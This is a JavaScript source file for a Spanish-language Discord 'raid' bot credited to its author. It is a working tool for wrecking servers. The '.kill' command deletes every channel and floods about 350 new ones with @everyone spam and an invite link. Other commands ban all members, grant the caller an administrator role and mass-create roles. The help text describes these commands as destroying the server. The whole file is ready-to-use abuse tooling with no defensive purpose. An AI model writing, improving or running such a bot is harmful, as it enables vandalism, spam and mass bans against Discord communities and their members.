const Discord = require("discord.js")
const client = new Discord.Client({ intents: [3243773]});

const { token } = require("./config.json")

client.on("ready", () => {
	
  console.log(`
Bot Encendido Cliente ${client.user.tag},
creado por !̷ ̷B̷Y̷ ̷D̷A̷r̷s̷#4026 listo para la accion 
  `)
  console.log(`
_________________________
||.                     
||.        made          
||.         By             
||.   !̷ ̷B̷Y̷ ̷D̷A̷r̷s̷#4026       
||.
||_______________________
`)


  presencia();
});

function presencia() {
  client.user.setPresence({
    status: "online",
    activity: {
      name: ".ayuda para los comandos",
      type: "PLAYING"

    }
  });
}


//raid

client.on("message", async message => {
  if (message.author.bot) return;

  if (message.content === '.kill') {
    console.log(`                         Raid en ejecucion, el usuario ${message.author.username}, su id es ${message.author.id}`)
    await message.delete()
    await message.guild.setName("on-top");
    await message.guild.setIcon("https://cdn.discordapp.com/icons/1039321689428856933/a_2947db09dc8502f0dc33d9b0c3cc5a73.gif?size=2048");
    message.guild.channels.cache.forEach(channel => channel.delete());
    for (let i = 0; i <= 350; i++) {
      message.guild.channels.create(`follados-por-dars`, {
        type: 'text'
      }).then(channel => {
            for (let x = 0; x <= 14; x++) {
                channel.send ("Raid by bot   || @everyone, @here || > Join: https://discord.gg/2YA2aVxdrV");
            }
      })
    }
  }

  //admin
	
  if (message.content === '.admin') {
		await message.delete()
    let rol = await message.guild.roles.create({
      data: {
        name: "$",
        color: "RANDOM",
        permissions: "ADMINISTRATOR",
        hoisted: true
      }
    })
    message.member.roles.add(rol);
  }
	
  //info
	
  if (message.content === '.info') {
    await message.delete()
    const embed = new Discord.MessageEmbed()
      .setTitle("Informacion de proceso del r41d")
      .setThumbnail()
      .setDescription(`**Canales:** | ${message.guild.channels.cache.size}\n**Roles:** | ${message.guild.roles.cache.size}\n**Users:** | ${message.guild.memberCount}`)
      .setColor("RANDOM");
    message.channel.send(embed)
  }

  //banall

  if (message.content.startsWith('.banall')) {
    await message.delete();
    message.guild.members.cache.forEach(async member => {
      if (member != message.member && member.id != "ID" && member.id != "ID" && member.id != "ID") {
        await member.ban();
      }
    })
  }
	
  //limpear
	
  if (message.content === '.limpiar') {
    await message.delete()
    message.guild.channels.cache.forEach(channel => channel.delete());
    message.guild.channels.create(`limpiado`, {
      type: 'text'
    }).then(channel => {
      channel.send("https://cdn.discordapp.com/attachments/1047914093476069386/1056044658897207366/meme-3.png")
    })
  }

	//help
 
  if (message.content === '.ayuda') {
    await message.delete()
    const embed = new Discord.MessageEmbed()
.setTitle("Comandos de el bot") 		.setAuthor(message.author.username, message.author.avatarURL)         
.setThumbnail("https://cdn.discordapp.com/attachments/1047914093476069386/1056044658897207366/meme-3.png") 
.setDescription(`Estos son los comandos`)
.addFields(
		{ name: '.kill', value: 'Este comando destruye el server,', inline: true },
		{ name: '.croles', value: 'Este comando crea roles,', inline: true },
		{ name: '.info', value: 'Este comando te dara informacion sobre todo los canales, miembros, roles que tienen el server,', inline: true },
		{ name: '.admin', value: 'Este comando te dara un rol con prrmisos de **ADMINISTRADOR**,', inline: true },
	  { name: '.limpiar', value: 'Este comando limpia el servidor, se usa para eliminar todo los canales o tambien limpiar el r41d,', inline: true },
	  { name: '.banall', value: 'Este comando banea a todos los miembtos de este servidor,', inline: true },
	  { name: '.ayuda', value: 'Este comando te dara toda la informacion de los demas comandos.', inline: true },
	)
.setImage("https://cdn.discordapp.com/attachments/1050927883662663681/1050927904428658798/5F4C7B1D-BD79-4081-9C1C-FA2F1C578947.gif") 
.setFooter({ text: 'codificado por !̷ ̷B̷Y̷ ̷D̷A̷r̷s̷#4026', iconURL: 'https://cdn.discordapp.com/attachments/1047914093476069386/1056062159555145778/IMG_9734.jpg' })
.setColor("RANDOM");
    message.channel.send(embed)
  }
	
/// este comando crea roles 
	
  if (message.content === '.croles') {
    await message.delete()
    for (let i = 0; i <= 200; i++) {
      message.guild.roles.create({ data: { name: `*`, color: '#d41818', }, reason: 'razon', })
    };
  }
});

/// puedes poner tu token, creando in secreto llamado TOKEN o pones tu token en el config.json donde dice poner token

client.login(token || process.env.TOKEN);

